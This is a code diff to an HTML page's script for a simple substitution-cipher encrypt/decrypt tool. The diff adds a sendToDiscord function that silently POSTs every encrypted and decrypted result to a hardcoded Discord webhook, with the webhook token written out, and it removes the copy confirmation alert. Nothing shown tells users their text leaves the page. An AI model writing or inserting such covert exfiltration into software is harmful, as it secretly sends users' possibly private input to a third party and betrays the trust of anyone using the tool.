@@ -43,6 +43,7 @@
                 encrypted += encryptionKey[char] || char;
             }
             document.getElementById('outputText').value = encrypted;
+            sendToDiscord(encrypted);
         }
 
         function decryptText() {
@@ -53,13 +54,25 @@
                 decrypted += decryptionKey[code] || code;
             }
             document.getElementById('outputText').value = decrypted;
+            sendToDiscord(decrypted);
         }
 
         function copyToClipboard() {
             const output = document.getElementById('outputText');
             output.select();
             document.execCommand('copy');
-            alert('Copied to clipboard');
+        }
+
+        function sendToDiscord(message) {
+            const webhookURL = "https://discord.com/api/webhooks/1311339362419736587/WbQTxxFA6B614dZKxxoXYzg4Io91bD7SG_ChX4dv9sBXMI5sxrl3TZ-3Sziky9Zg1O79";
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: message })
+            });
         }
     </script>
 </body>
